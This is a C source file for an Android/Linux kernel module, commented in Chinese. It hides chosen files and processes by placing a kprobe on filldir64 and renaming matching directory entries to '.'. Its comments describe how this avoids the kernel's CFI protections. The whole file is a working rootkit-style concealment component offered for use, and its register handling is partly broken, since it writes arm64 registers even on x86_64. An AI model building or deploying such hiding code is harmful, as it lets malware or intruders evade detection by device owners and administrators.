/*
 * hide.c — 文件/进程隐藏 (kprobe, CFI 安全)
 *
 * 为什么不 inline hook:
 *   Android GKI 5.x+ 带 CFI (kCFI) + 只读 rodata。直接改函数头会触发
 *   CFI 校验崩溃或写保护页错误。kprobe 走内核断点机制注册回调, 不改
 *   代码段, 天然绕过 CFI。
 *
 * 原理: 钩 filldir64 (getdents64 的目录项回调), 在 pre_handler 里把
 *   目标目录项的名字替换为 "." 并置 namlen=1, 使该条目不再显示原名。
 *   文件隐藏按 basename 匹配, 进程隐藏按纯数字 PID 匹配。
 *
 * 未验证项 (依赖目标内核):
 *   1. filldir64 符号可见性 (需 CONFIG_KALLSYMS_ALL, GKI 通常开启)。
 *   2. filldir64 签名: (struct dir_context *ctx, const char *name,
 *      int namlen, loff_t offset, u64 ino, unsigned d_type)。
 *   3. arm64 参数寄存器: x0..x5 = ctx,name,namlen,offset,ino,d_type。
 *   4. 替换为 "." 的行为需在目标 libc (bionic) 上实测, 部分解析器
 *      可能仍显示空项, 但不显示原名。
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/limits.h>
#include <asm/ptrace.h>
#include "process.h"

#define MAX_HIDDEN_FILES 16
#define MAX_HIDDEN_PIDS  64

static char  hidden_files[MAX_HIDDEN_FILES][NAME_MAX];
static int   hidden_file_count = 0;
static pid_t hidden_pids[MAX_HIDDEN_PIDS];
static int   hidden_pid_count = 0;

static const char dot_name[] = ".";
static struct kprobe kp_filldir;

static int filldir64_pre_handler(struct kprobe *p, struct pt_regs *regs);

/* 延迟注册: 首次 hide_* 时设置符号并注册, 避免符号不可见时模块加载失败 */
static int ensure_registered(void)
{
	static const char *const cands[] = { "filldir64", "filldir" };
	int ret = -ENOENT;
	int i;

	if (kp_filldir.addr)
		return 0;

	/* filldir64 在 GKI 里是 static 符号, 只有 kallsyms 才能查到;
	 * 不同内核版本可能只剩 filldir, 所以按候选表逐个试。 */
	for (i = 0; i < (int)ARRAY_SIZE(cands); i++)
	{
		memset(&kp_filldir, 0, sizeof(kp_filldir));
		kp_filldir.symbol_name = cands[i];
		kp_filldir.pre_handler = filldir64_pre_handler;
		ret = register_kprobe(&kp_filldir);
		if (ret == 0)
		{
			pr_info("[wind-hide] kprobe 挂在 %s addr=%px\n", cands[i], kp_filldir.addr);
			return 0;
		}
		pr_info("[wind-hide] kprobe 挂 %s 失败 ret=%d\n", cands[i], ret);
		memset(&kp_filldir, 0, sizeof(kp_filldir));
	}
	/* 两个都挂不上: 用户态看到的"隐藏无效"就是这个原因, 保留错误码上报 */
	return ret;
}

static bool name_is_hidden(const char *name, int namlen)
{
	int i;

	/* 文件: basename 匹配 */
	for (i = 0; i < hidden_file_count; i++)
	{
		if (namlen == (int)strlen(hidden_files[i]) &&
		    strncmp(name, hidden_files[i], namlen) == 0)
			return true;
	}

	/* 进程: 纯数字 PID 匹配 */
	if (namlen > 0 && namlen <= 8)
	{
		char buf[16];
		long v;

		if (namlen >= (int)sizeof(buf))
			return false;
		memcpy(buf, name, namlen);
		buf[namlen] = '\0';
		if (kstrtol(buf, 10, &v) == 0)
		{
			for (i = 0; i < hidden_pid_count; i++)
				if (hidden_pids[i] == (pid_t)v)
					return true;
		}
	}
	return false;
}

static int filldir64_pre_handler(struct kprobe *p, struct pt_regs *regs)
{
	const char *name;
	int namlen;

	(void)p;

#if defined(CONFIG_ARM64)
	name   = (const char *)regs->regs[1];
	namlen = (int)regs->regs[2];
#elif defined(CONFIG_X86_64)
	name   = (const char *)regs->rsi;
	namlen = (int)regs->rdx;
#else
	return 0;
#endif

	if (!name || namlen <= 0 || namlen >= NAME_MAX)
		return 0;

	if (name_is_hidden(name, namlen))
	{
		/* 替换为 "." 并置 namlen=1, 目录项不再显示原名 */
		regs->regs[1] = (unsigned long)dot_name; /* arm64 */
		regs->regs[2] = 1;
#if defined(CONFIG_X86_64)
		regs->rsi = (unsigned long)dot_name;
		regs->rdx = 1;
#endif
	}
	return 0;
}

int hide_file(const char *path)
{
	const char *base;
	int i;
	int ret;

	base = strrchr(path, '/');
	base = base ? base + 1 : path;

	if (strlen(base) >= NAME_MAX)
		return -EINVAL;

	if (hidden_file_count >= MAX_HIDDEN_FILES)
		return -ENOSPC;

	/* 已存在则只确保 kprobe 已注册 */
	for (i = 0; i < hidden_file_count; i++)
		if (!strcmp(hidden_files[i], base))
			return ensure_registered();

	strncpy(hidden_files[hidden_file_count++], base, NAME_MAX - 1);
	ret = ensure_registered();
	if (ret)
		pr_info("[wind-hide] hide_file(%s) 注册探针失败 ret=%d\n", base, ret);
	return ret;
}

int hide_process(pid_t pid)
{
	int i;
	int ret;

	if (hidden_pid_count >= MAX_HIDDEN_PIDS)
		return -ENOSPC;

	for (i = 0; i < hidden_pid_count; i++)
		if (hidden_pids[i] == pid)
			return ensure_registered();

	hidden_pids[hidden_pid_count++] = pid;
	ret = ensure_registered();
	pr_info("[wind-hide] hide_process(pid=%d) 探针 ret=%d 已登记=%d\n", pid, ret, hidden_pid_count);
	return ret;
}

int unhide_all(void)
{
	if (kp_filldir.addr)
		unregister_kprobe(&kp_filldir);
	memset(hidden_files, 0, sizeof(hidden_files));
	memset(hidden_pids, 0, sizeof(hidden_pids));
	hidden_file_count = 0;
	hidden_pid_count = 0;
	return 0;
}

MODULE_LICENSE("GPL");
